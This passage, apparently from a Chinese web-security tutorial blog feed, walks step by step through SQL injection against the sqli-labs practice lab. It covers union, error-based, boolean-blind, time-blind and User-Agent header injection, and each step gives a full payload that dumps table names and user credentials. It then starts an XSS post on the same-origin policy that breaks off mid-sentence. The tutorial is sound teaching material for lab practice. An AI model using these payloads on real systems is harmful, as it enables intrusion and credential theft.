class="hljs-emphasis">&#x27;security&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span class="hljs-emphasis">&#x27;users&#x27;</span>--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and 1=2 union select 1,2,concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="基于联合查询的post注入">1.3 基于联合查询的POST注入</h2><h3 id="post注入原理">1.3.1 POST注入原理</h3><p>POST注入，其注入点存在于POST表单中的参数处。攻击者可以通过代理抓包工具（如Burpsuite）拦截并修改POST表单中的参数，利用unionselect命令进行注入，暴露数据库中存储的信息。</p><h3 id="注入流程">1.3.2 注入流程</h3><p>实例：sqli-labs/Less-11</p><h1 id="基于报错的注入">2. 基于报错的注入</h1><h2 id="概述">2.1 概述</h2><ul><li><p>基于报错的注入，是指通过构造特定的SQL语句，让攻击者想要查询的信息（如数据库名、版本号、用户名等）通过页面的错误提示回显出来。</p></li><li><p>报错注入一般需要具备两个前提条件：</p><ul><li><p>Web应用程序未关闭数据库报错函数，对于一些SQL语句的错误直接回显在页面上；</p></li><li><p>后台未对一些具有报错功能的函数进行过滤。常用的报错功能函数包括extractvalue()、updatexml()、floor()、exp()等。</p></li></ul></li></ul><h2 id="extractvalue函数">2.2 extractvalue()函数</h2><h3 id="原理-2">2.2.1 原理</h3><ul><li>作用：对XML文档进行查询，相当于在HTML文件中用标签查找元素。</li><li>语法：<code>extractvalue(XML_document, XPath_string)</code><ul><li>参数1：<code>XML_document</code>是String格式，为XML文档对象的名称；</li><li>参数2：<code>XPath_string</code>(Xpath格式的字符串)，注入时可操作的地方。</li></ul></li><li>报错原理：xml文档中查找字符位置是用/xxx/xxx/xxx/…这种格式，如果写入其他格式就会报错，并且会返回写入的非法格式内容，错误信息如：<code>XPATH syntax error:'xxxxxxxx’</code>。</li><li>注意：extractvalue()函数所能显示的错误信息最大长度为32，如果错误信息超过了最大长度，有可能导致显示不全。因此，有时需要借助limit来做分行显示。</li><li>实例:<code>select extractvalue(1,concat('~',user()))</code>——主要是构造concat</li></ul><h3 id="注入流程-1">2.2.2 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型(本例为字符型注入)</p></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,database())<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//limit 0,1:显示security库中的第1张表的名字;select语句需要括号包裹</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select table_name from information_schema.tables where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> limit 0,1))<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//显示users表中的第1个字段的名字</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select column_name from information_schema.columns where table_schema=<span class="hljs-emphasis">&#x27;security&#x27;</span> and table_name=<span class="hljs-emphasis">&#x27;users&#x27;</span> limit 0,1))<br>)--+<br><br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//显示第1组数据</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and extractvalue(<br>1,concat(<span class="hljs-emphasis">&#x27;~&#x27;</span>,(select concat_ws(<span class="hljs-emphasis">&#x27;,&#x27;</span>,id,username,password) from security.users limit 0,1))<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="floor函数">2.3 floor()函数</h2><h3 id="原理-3">2.3.1 原理</h3><ul><li>在进行报错注入时，floor()函数一般需要与rand()、count()、groupby联用。</li><li>作用：<ul><li>floor(x)：对参数x向下取整；</li><li>rand()：生成一个0~1之间的随机浮点数；</li><li>count(*)：统计某个表下总共有多少条记录；</li><li>group by x：按照（by）一定的规则（x）进行分组；</li></ul></li><li>报错原理：floor()函数与groupby、rand()联用时，如果临时表中没有该主键，则在插入前会再计算一次rand()，然后再由groupby将计算出来的主键直接插入到临时表格中，导致主键重复报错，错误信息如：Duplicateentry ‘…’ for key 'group_key’。</li><li>实例:<code>select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a</code>——主要是构造concat</li></ul><h3 id="注入流程-2">2.3.2 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型（本例为字符型注入）</p></li><li><p>获取网站当前所在数据库的库名</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-1/?id=1&#x27; and (select 1 from (select count(<span class="hljs-strong">*),</span><br><span class="hljs-strong">concat(database(),floor(rand(0)*</span>2))x <br>from information_schema.tables group by x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//limit 0,1:显示security库中的第1张表的名字<br>http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<br>concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <br><span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//显示users表中的第1个字段的名字<br>http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<br>concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <br><span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">//显示第1组数据<br>http://[靶机IP]/sqli-labs/Less-1/?id=1&#x27; and (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),<br>concat((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> security.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br>)--+<br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="其他函数">2.4 其他函数</h2><h3 id="updatexml">2.4.1 updatexml()</h3><p>实例:<code>select updatexml(1,concat('~',user()),1)</code></p><h3 id="exp">2.4.2 exp()</h3><p>实例:<code>select exp(~(select * from (select user()) as x))</code></p><h3 id="mysql数据库报错功能函数汇总">2.4.3MySQL数据库报错功能函数汇总</h3><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202311221446385.png"alt="image-20231122144647534" /><figcaption aria-hidden="true">image-20231122144647534</figcaption></figure><h1 id="sql盲注">3. SQL盲注</h1><h2 id="基于布尔的盲注">3.1 基于布尔的盲注</h2><h3 id="原理-4">3.1.1 原理</h3><p>某些场合下，页面返回的结果只有<strong>两种（正常或错误）</strong>。通过构造SQL判断语句，查看页面的返回结果（Trueor False）来判断哪些SQL判断条件成立，通过此来获取数据库中的数据。</p><h3 id="注入流程-3">3.1.2 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型（本例为字符型注入）</p></li><li><p>盲猜网站当前所在数据库的库名长度</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//假设当前所在数据库的库名长度为N，尝试使用判断语句length(database())=M，不断变化M的值去猜测，如果M不等于N，页面应该</span><br><span class="hljs-comment">//显示为False；如果M等于N，页面应该显示为True。</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and length(database())=7--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜网站当前所在数据库的库名字符串</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//本步骤通过逐个字母盲猜的方式进行。</span><br><span class="hljs-comment">//假设库名字符串的第1个字母为a，那么条件判断语句 substr(库名字符串,1,1)=‘a’ 以及 ascii(substr(库名字串,1,1))=97 //返回的结果均应为True（小写字母a的ASCII码为97）；</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and substr(database(),1,1)=<span class="hljs-emphasis">&#x27;s&#x27;</span>--+<br>或<br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-8/?id=1&#x27; and ascii(substr(database(),1,1))=115--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜数据库security的全部表名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>张表的表名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-8</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span><span class="hljs-string">e&#x27;--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表的全部字段名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>个字段名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-8</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select column_name from information_schema.columns where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span>i<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表username和password字段的全部值</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>组数据的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-8</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr((select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;</span>D<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-8/?id=1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h2 id="基于时间的盲注">3.2 基于时间的盲注</h2><h3 id="原理-5">3.2.1 原理</h3><p>某些场合下，页面只有<strong>一种</strong>返回结果，使用具有延时功能的函数sleep()、benchmark()等，通过判断这些函数是否正常执行来获取数据库中的数据。</p><h3 id="注入流程-4">3.2.3 注入流程</h3><ol type="1"><li><p>寻找注入点,判断注入类型</p></li><li><p>盲猜网站当前所在数据库的库名长度</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//假设当前所在数据库的库名长度为N，尝试使用判断语句if((length(database())=M),sleep(5),1)，不断变化M的值去猜测，如果M等于N，此时sleep(5)会成功执行，页面应该会有明显延迟。</span><br><span class="hljs-comment">//语法格式: if(expr,expr2,expr3)expr1为true则返回expr2，expr1为false则返回expr3。</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(length(database())=7,sleep(5),1)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜网站当前所在数据库的库名字符串</p><blockquote><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-comment">//本步骤通过逐个字母盲猜的方式进行。</span><br><span class="hljs-comment">//假设库名字符串的第1个字母为a，那么条件判断语句 if(substr(库名字符串,1,1)=‘a’,sleep(5),1) 以及 //if(ascii(substr(库名字符串,1,1))=97,sleep(5),1) 中，sleep(5)能成功执行，页面应该会有明显延迟；</span><br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(substr(database(),1,1)=<span class="hljs-emphasis">&#x27;s&#x27;</span>,sleep(5),1)--+<br>或<br><span class="hljs-link">http://</span>[<span class="hljs-string">靶机IP</span>]/sqli-labs/Less-9/?id=1&#x27; and if(ascii(substr(database(),1,1))=115,sleep(5),1)--+<br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜数据库security的全部表名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>张表的表名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr((select table_name from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span><span class="hljs-string">e&#x27;,sleep(5),1)--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">101</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表的全部字段名</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>个字段名的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr((select column_name from information_schema.columns where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27; limit 0,1),1,1)=&#x27;</span>i<span class="hljs-string">&#x27;,sleep(5),1)--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">105</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>盲猜users表username和password字段的全部值</p><blockquote><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">//猜测第<span class="hljs-number">1</span>组数据的第<span class="hljs-number">1</span>个字符：<br>http://[靶机IP]/sqli-labs/Less<span class="hljs-number">-9</span>/?id=<span class="hljs-number">1</span><span class="hljs-string">&#x27; and if(substr((select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,username,password) from security.users limit 0,1),1,1)=&#x27;</span>D<span class="hljs-string">&#x27;,sleep(5),1)--+</span><br><span class="hljs-string">或</span><br><span class="hljs-string">http://[靶机IP]/sqli-labs/Less-9/?id=1&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">if</span>(ascii(substr((<span class="hljs-keyword">select</span> concat_ws(<span class="hljs-string">&#x27;,&#x27;</span>,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">68</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure></blockquote></li></ol><h1 id="http头部注入">4. HTTP头部注入</h1><h2 id="原理-6">4.1 原理</h2><ul><li><p>有时候，后台开发人员为了验证客户端HTTPHeader（比如常用的Cookie验证等）或者通过HTTPHeader头信息获取客户端的一些信息（比如User-Agent、Accept字段等），会对客户端HTTPHeader进行获取并使用SQL语句进行处理，如果此时没有足够的安全考虑，就可能导致基于HTTPHeader的注入漏洞。</p></li><li><p>常见的HTTPHeader注入类型包括Cookie注入、Referer注入、User-Agent注入、XFF注入等(注入位置)。</p></li></ul><h2 id="注入流程-5">4.2 注入流程</h2><ol type="1"><li><p>寻找注入点,判断注入类型（字符 or 数字）</p></li><li><p>获取网站当前所在数据库的库名（使用基于报错的注入方法）</p><blockquote><figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey">//sqli-labs Less-<span class="hljs-number">18</span><br>//$insert=<span class="hljs-string">&quot;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (&#x27;$uagent&#x27;, &#x27;$IP&#x27;, $uname)&quot;</span><span class="hljs-comment">;</span><br><span class="hljs-title">User-Agent:</span>Mozilla/<span class="hljs-number">5.0</span>......Firefox/<span class="hljs-number">46.0</span>&#x27; <span class="hljs-literal">and</span> extractvalue(<span class="hljs-number">1</span>,concat(&#x27;~&#x27;,database())),&#x27;&#x27;,&#x27;&#x27;)#<br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取数据库security的全部表名</p><blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">User-Agent:Mozilla/<span class="hljs-number">5.0</span>......Firefox/<span class="hljs-number">46.0&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span>))),<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表的全部字段名</p><blockquote><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp">User-Agent:Mozilla/<span class="hljs-number">5.0</span>......Firefox/<span class="hljs-number">46.0&#x27;</span> <span class="hljs-function"><span class="hljs-keyword">and</span> <span class="hljs-title">extractvalue</span>(<span class="hljs-params"><span class="hljs-number">1</span>,concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> group_concat(column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> table_name=<span class="hljs-string">&#x27;users&#x27;</span>))),<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure></blockquote></li><li><p>获取users表id、username和password字段的全部值</p><blockquote><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">//</span>第一行数据<br>User-Agent:Mozilla<span class="hljs-regexp">/5.0......Firefox/</span><span class="hljs-number">46.0</span><span class="hljs-string">&#x27; and extractvalue(1,concat(&#x27;</span>~<span class="hljs-string">&#x27;,(select concat_ws(&#x27;</span>,<span class="hljs-string">&#x27;,id,username,password) from security.users limit 0,1))),&#x27;</span><span class="hljs-string">&#x27;,&#x27;</span><span class="hljs-string">&#x27;)#</span><br></code></pre></td></tr></table></figure></blockquote></li></ol>]]></content>
    
    
    <categories>
      
      <category>安全服务</category>
      
      <category>Web渗透</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>CH5-Web安全-XSS攻击</title>
    <link href="/2023/10/31/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/05Web%E5%AE%89%E5%85%A8-XSS%E6%94%BB%E5%87%BB/"/>
    <url>/2023/10/31/%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E6%8A%80%E6%9C%AF/05Web%E5%AE%89%E5%85%A8-XSS%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="同源策略">1. 同源策略</h1><h3 id="含义">1.1 含义</h3><p>1995年，同源政策由 Netscape公司引入浏览器。目前，所有浏览器都实行这个政策。最初，它的含义是指，A网页设置的Cookie，B网页不能打开，除非这两个网页"同源"。所谓"同源"指的是"三个相同"：</p><blockquote><ul><li>协议相同</li><li>域名相同</li><li>端口相同</li></ul></blockquote><p>举例来说，<code>http://www.example.com/dir/page.html</code>这个网址，协议是<code>http://</code>，域名是<code>www.example.com</code>，端口是<code>80</code>（默认端口可以省略）。它的同源情况如下：</p><blockquote><ul><li><code>http://www.example.com/dir2/other.html</code>：同源</li><li><code>http://example.com/dir/other.html</code>：不同源（域名不同）</li><li><code>http://v2.www.example.com/dir/other.html</code>：不同源（域名不同）</li><li><code>http://www.example.com:81/dir/other.html</code>：不同源（端口不同）</li></ul></blockquote><h3 id="目的">1.2 目的</h3><p>同源政策的目的，是为了保证用户信息的安全，防止恶意的网站窃取数据。设想这样一种情况：A网站是一家银行，用户登录以后，又去浏览其他网站。如果其他网站可以读取A网站的Cookie，会发生什么？</p><p>很显然，如果 